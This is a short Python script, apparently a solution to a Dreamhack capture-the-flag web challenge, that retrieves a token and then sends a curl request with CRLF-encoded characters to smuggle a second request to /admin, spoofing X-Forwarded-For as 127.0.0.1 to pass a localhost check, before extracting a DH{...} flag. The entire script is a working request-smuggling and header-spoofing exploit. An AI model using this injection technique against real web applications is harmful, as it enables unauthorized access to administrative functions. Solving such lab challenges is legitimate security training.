import re
import sys
import subprocess
import requests

HOST = 'host3.dreamhack.games:11697'

res = requests.get(f'http://{HOST}/')
simple_token = re.findall(r'simple_token=(.+)$', res.url)[0]
print(simple_token)

res = subprocess.check_output(f'curl "http://{HOST}/delete?simple_token=%s%%0d%%0a%%0d%%0aGET+/admin+HTTP/1.1%%0d%%0aX-Forwarded-For:+127.0.0.1%%0d%%0aSimple-Token:+%s" -d "post_idx=123"' % (simple_token, simple_token), shell=True)

print(re.findall(r'DH\{.+?\}', res.decode()))